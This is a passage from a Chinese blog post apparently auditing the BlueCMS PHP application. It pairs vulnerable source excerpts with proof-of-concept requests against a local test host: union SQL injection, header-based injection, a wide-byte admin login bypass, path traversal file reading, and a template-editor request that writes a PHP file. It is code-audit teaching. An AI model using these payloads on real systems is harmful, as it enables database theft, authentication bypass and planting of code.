class="hljs-string">&quot;SELECT * FROM &quot;</span>.table(<span class="hljs-string">&#x27;ad&#x27;</span>).<span class="hljs-string">&quot; WHERE ad_id =&quot;</span>.<span class="hljs-variable">$ad_id</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ad</span>[<span class="hljs-string">&#x27;time_set&#x27;</span>] == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-variable">$ad_content</span> = <span class="hljs-variable">$ad</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;!--\r\ndocument.write(\&quot;&quot;</span>.<span class="hljs-variable">$ad_content</span>.<span class="hljs-string">&quot;\&quot;);\r\n--&gt;\r\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>复现漏洞时我是想利用报错注入快一点，但没有成功，奇怪，下面用union注入复现：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://bluecms.test:<span class="hljs-number">8888</span>/ad_js.php?ad_id=<span class="hljs-number">0</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,version()--+<br></code></pre></td></tr></table></figure><img src="img/blueCMS/image-20210806144015218.png" alt="image-20210806144015218" style="zoom:50%;" /><h3 id="SERVER-的突破"><a href="#SERVER-的突破" class="headerlink" title="$_SERVER 的突破"></a>$_SERVER 的突破</h3><p>上面知道只对GPC数据做了全局过滤，还有一个 <code>$_SERVER</code>是没有过滤的，其实 <code>$_SERVER</code> 也是可以传入外部可控数据的</p><blockquote><p>guest_book.php</p></blockquote><ul><li>guest_book.php 是一个处理用户留言功能的模块，但用户发送留言时，会同时把用户留言的ip地址一起放到数据库中</li><li>其中 <code>$online_ip</code> 来自 common.fun.php 中 getip() 函数</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require</span> dirname(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&#x27;/include/common.inc.php&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;list&#x27;</span>)&#123;<br>  ……<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;send&#x27;</span>)&#123;<br>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO &quot;</span> . table(<span class="hljs-string">&#x27;guest_book&#x27;</span>) . <span class="hljs-string">&quot; (id, rid, user_id, add_time, ip, content) </span><br><span class="hljs-string">VALUES (&#x27;&#x27;, &#x27;<span class="hljs-subst">$rid</span>&#x27;, &#x27;<span class="hljs-subst">$user_id</span>&#x27;, &#x27;<span class="hljs-subst">$timestamp</span>&#x27;, &#x27;<span class="hljs-subst">$online_ip</span>&#x27;, &#x27;<span class="hljs-subst">$content</span>&#x27;)&quot;</span>;<br><span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>common.fun.php</p></blockquote><ul><li>getip() 首先会在<code>HTTP_</code>开头的环境变量寻找ip，<code>HTTP_</code>开头的变量是可控的，来自请求头</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getip</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&#x27;HTTP_CLIENT_IP&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_CLIENT_IP&#x27;</span>); <br>&#125;<br><span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>)) <br>&#123;<br><span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);<br>&#125;<br>……<br>  <span class="hljs-keyword">else</span><br>&#123; <br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br>&#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$ip</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>漏洞复现：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/guest_book.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>bluecms:8888<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br>X_FORWARDED_FOR: 192.168.44.1&#x27;,user())#<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=8d9d7ed9da5a96ac9b0093dceed684f9<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>37<br><br><span class="dts">content=hello<span class="hljs-variable">&amp;act</span>=send<span class="hljs-variable">&amp;page_id</span>=<span class="hljs-number">1</span><span class="hljs-variable">&amp;rid</span>=</span><br></code></pre></td></tr></table></figure><p>效果：</p><img src="img/blueCMS/image-20210607182605405.png" alt="image-20210607182605405" style="zoom: 33%;" /><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>上面有提到这一点，因为程序在数据库链接处设置了GBK编码，利用宽字节注入可以绕过程序过滤，所以BlueCMS的sql注入基本都有存在，下面就找一个地方验证一下</p><blockquote><p>admin/login.php</p></blockquote><ul><li>admin/login.php 是后台管理员登陆页面，如果这里存在sql注入常见的利用方式就是注入万能密码</li><li>可以看到后台验证验证用户是否登陆的依据：具有非空<code>$_SESSION[&#39;admin_id&#39;]</code>值</li><li>$admin_name 和 $admin_pwd 通过post获取，post数据会通过addslashs()函数过滤。验证的关键函数为<strong>check_admin()</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(dirname(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&#x27;/include/common.inc.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;login&#x27;</span>)&#123;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin_id&#x27;</span>])&#123;<br> showmsg(<span class="hljs-string">&#x27;您已登录，不用再次登录&#x27;</span>, <span class="hljs-string">&#x27;index.php&#x27;</span>);<br> &#125;<br>  ……<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;do_login&#x27;</span>)&#123;<br>  <span class="hljs-variable">$admin_name</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_name&#x27;</span>]) ? trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_name&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$admin_pwd</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_pwd&#x27;</span>]) ? trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_pwd&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(check_admin(<span class="hljs-variable">$admin_name</span>, <span class="hljs-variable">$admin_pwd</span>))&#123;<br> update_admin_info(<span class="hljs-variable">$admin_name</span>);<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$remember</span> == <span class="hljs-number">1</span>)&#123;<br> setcookie(<span class="hljs-string">&#x27;Blue[admin_id]&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin_id&#x27;</span>], time()+<span class="hljs-number">86400</span>);<br> setcookie(<span class="hljs-string">&#x27;Blue[admin_name]&#x27;</span>, <span class="hljs-variable">$admin_name</span>, time()+<span class="hljs-number">86400</span>);<br>setcookie(<span class="hljs-string">&#x27;Blue[admin_pwd]&#x27;</span>, md5(md5(<span class="hljs-variable">$admin_pwd</span>).<span class="hljs-variable">$_CFG</span>[<span class="hljs-string">&#x27;cookie_hash&#x27;</span>]), time()+<span class="hljs-number">86400</span>);<br> &#125;<br> &#125;<span class="hljs-keyword">else</span>&#123;<br> showmsg(<span class="hljs-string">&#x27;您输入的用户名和密码有误&#x27;</span>);<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>admin/include/common.fun.php</p></blockquote><p>判断的依据是同时查询用户名和密码，查询到结果则为真</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_admin</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$pwd</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>;<br><span class="hljs-variable">$row</span> = <span class="hljs-variable">$db</span>-&gt;getone(<span class="hljs-string">&quot;SELECT COUNT(*) AS num FROM &quot;</span>.table(<span class="hljs-string">&#x27;admin&#x27;</span>).<span class="hljs-string">&quot; WHERE admin_name=&#x27;<span class="hljs-subst">$name</span>&#x27; and pwd = md5(&#x27;<span class="hljs-subst">$pwd</span>&#x27;)&quot;</span>);<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;num&#x27;</span>] &gt; <span class="hljs-number">0</span>)<br> &#123;<br> <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br> &#125;<br> <span class="hljs-keyword">else</span><br> &#123;<br> <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们的宽字节利用不就来了，注入永真的sql语句，我们就绕过了前台的限制</p><p>注意浏览器会自动对post数据url编码，我们注入的<code>%</code>会被编码导致注入宽字节失效，最好通过抓包取消url编码</p><img src="img/blueCMS/image-20210607190018647.png" alt="image-20210607190018647" style="zoom:50%;" /><h2 id="任意文件读取-写入"><a href="#任意文件读取-写入" class="headerlink" title="任意文件读取/写入"></a>任意文件读取/写入</h2><p>在 BlueCMS 后台处有一个编辑模板的功能，对于这种功能，安全小伙应该保持敏感，这里会出现读取和写入的操作，很有可能就存在任意文件读取/写入漏洞</p><img src="img/blueCMS/image-20210806165617800.png" alt="image-20210806165617800" style="zoom:50%;" /><img src="img/blueCMS/image-20210806165645739.png" alt="image-20210806165645739" style="zoom: 33%;" /><h3 id="审计细节"><a href="#审计细节" class="headerlink" title="审计细节"></a>审计细节</h3><blockquote><p>admin/tpl_manage.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(dirname(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;/include/common.inc.php&#x27;</span>);<br><span class="hljs-variable">$act</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;act&#x27;</span>]) ? trim(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;act&#x27;</span>]) : <span class="hljs-string">&#x27;list&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;list&#x27;</span>)&#123;<br>  <span class="hljs-variable">$dir</span> = BLUE_ROOT.<span class="hljs-string">&#x27;templates/default&#x27;</span>;<br>  <span class="hljs-comment">// 列出$dir下的文件</span><br>……<br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;edit&#x27;</span>)&#123;<br>  <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tpl_name&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$handle</span> = @fopen(BLUE_ROOT.<span class="hljs-string">&#x27;templates/default/&#x27;</span>.<span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;rb&#x27;</span>))&#123;<br>showmsg(<span class="hljs-string">&#x27;打开目标模板文件失败&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$tpl</span>[<span class="hljs-string">&#x27;content&#x27;</span>] = fread(<span class="hljs-variable">$handle</span>, filesize(BLUE_ROOT.<span class="hljs-string">&#x27;templates/default/&#x27;</span>.<span class="hljs-variable">$file</span>));<br><span class="hljs-variable">$tpl</span>[<span class="hljs-string">&#x27;content&#x27;</span>] = htmlentities(<span class="hljs-variable">$tpl</span>[<span class="hljs-string">&#x27;content&#x27;</span>], ENT_QUOTES, GB2312);<br>fclose(<span class="hljs-variable">$handle</span>);<br><span class="hljs-variable">$tpl</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$file</span>;<br>template_assign(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;current_act&#x27;</span>, <span class="hljs-string">&#x27;tpl&#x27;</span>), <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;编辑模板&#x27;</span>, <span class="hljs-variable">$tpl</span>));<br><span class="hljs-variable">$smarty</span>-&gt;display(<span class="hljs-string">&#x27;tpl_info.htm&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;do_edit&#x27;</span>)&#123;<br><span class="hljs-variable">$tpl_name</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tpl_name&#x27;</span>]) ? trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tpl_name&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br> <span class="hljs-variable">$tpl_content</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tpl_content&#x27;</span>]) ? deep_stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;tpl_content&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$tpl_name</span>))&#123;<br> <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br> &#125;<br> <span class="hljs-variable">$tpl</span> = BLUE_ROOT.<span class="hljs-string">&#x27;templates/default/&#x27;</span>.<span class="hljs-variable">$tpl_name</span>;<br> <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$handle</span> = @fopen(<span class="hljs-variable">$tpl</span>, <span class="hljs-string">&#x27;wb&#x27;</span>))&#123;<br>showmsg(<span class="hljs-string">&quot;打开目标模版文件 <span class="hljs-subst">$tpl</span> 失败&quot;</span>);<br> &#125;<br> <span class="hljs-keyword">if</span>(fwrite(<span class="hljs-variable">$handle</span>, <span class="hljs-variable">$tpl_content</span>) === <span class="hljs-literal">false</span>)&#123;<br> showmsg(<span class="hljs-string">&#x27;写入目标 $tpl 失败&#x27;</span>);<br> &#125;<br> fclose(<span class="hljs-variable">$handle</span>);<br> showmsg(<span class="hljs-string">&#x27;编辑模板成功&#x27;</span>, <span class="hljs-string">&#x27;tpl_manage.php&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>$act</code>  可控，用于指定操作，具有的操作为<strong>list, edit 和do_edit</strong></li><li>默认操作 <strong>list</strong>，列出指定目录下的文件</li><li>操作 <strong>edit</strong> 用于读取指定目录下的<code>$file</code>，该参数可控，通过 <code>../</code> 可以实现目录穿越，这里就有任意文件读取漏洞</li><li>操作 do_edit 将 <code>$tpl_content</code> 写入到 <code>$tpl_name</code> 文件中，两个参数都可控，不过写入的内容 <code>$tpl_content</code> 会通过 deep_stripslashes() 过滤，同时还要注意 <code>$tpl_content</code> 是通过 POST 方式传入的，还会经过 addslashes() 处理</li></ul><blockquote><p>include/common.fun.php</p></blockquote><p>查看 deep_stripslashes() ，其实就是使用 stripslashes()  来消除 addslashes() 的影响，所以这里我们输入的内容完全可控，这里将同时存在任意文件读取和写入的漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deep_stripslashes</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br> <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$str</span>))<br> &#123;<br> <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$str</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>)<br> &#123;<br> <span class="hljs-variable">$str</span>[<span class="hljs-variable">$key</span>] = deep_stripslashes(<span class="hljs-variable">$val</span>);<br> &#125;<br> &#125;<br> <span class="hljs-keyword">else</span><br> &#123;<br> <span class="hljs-variable">$str</span> = stripslashes(<span class="hljs-variable">$str</span>);<br> &#125;<br> <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>利用目录穿越读取任意文件</p><img src="img/blueCMS/image-20210809180020442.png" alt="image-20210809180020442" style="zoom:50%;" /><p>直接构造一个post请求修改一个不存在的文件，这样将会创建一个文件并写入，poc如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/admin/tpl_manage.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>bluecms.test:8888<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>59<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://bluecms.test:8888<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://bluecms.test:8888/admin/tpl_manage.php?act=edit&amp;tpl_name=news_info.htm<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=bb499d4e1bddb4c5b2c6cd16c39e5c77<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="php">tpl_content=<span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span>&amp;tpl_name=php.php&amp;act=do_edit</span><br></code></pre></td></tr></table></figure><p>效果：</p><img src="img/blueCMS/image-20210809180812158.png" alt="image-20210809180812158" style="zoom:50%;" /><h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><blockquote><p>user.php</p></blockquote><p>$id 可控，直接传入unlink()会可造成任意文件删除漏洞。不过在unlink()操作前会执行一条sql语句，BlueCMS 初始数据库是没有company_image表的，导致数据库报错是执行不到unlink()操作的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;del_pic&#x27;</span>) &#123;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-string">&quot;DELETE FROM &quot;</span> . table(<span class="hljs-string">&#x27;company_image&#x27;</span>) . <span class="hljs-string">&quot; WHERE path=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>);<br>    <span class="hljs-keyword">if</span> (file_exists(BLUE_ROOT . <span class="hljs-variable">$id</span>)) &#123;<br>        @unlink(BLUE_ROOT . <span class="hljs-variable">$id</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>BlueCMS 总体代码比较简单，出现的漏洞也比较典型，没有什么特别之处。另外本文并没有针对 XSS 漏洞做审计，对于这种简单的系统使用黑盒测试的方法似乎要更快一点。</p><p>参考：<a href="https://xz.aliyun.com/t/7074">https://xz.aliyun.com/t/7074</a></p>]]></content>
    
    
    <categories>
      
      <category>php代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
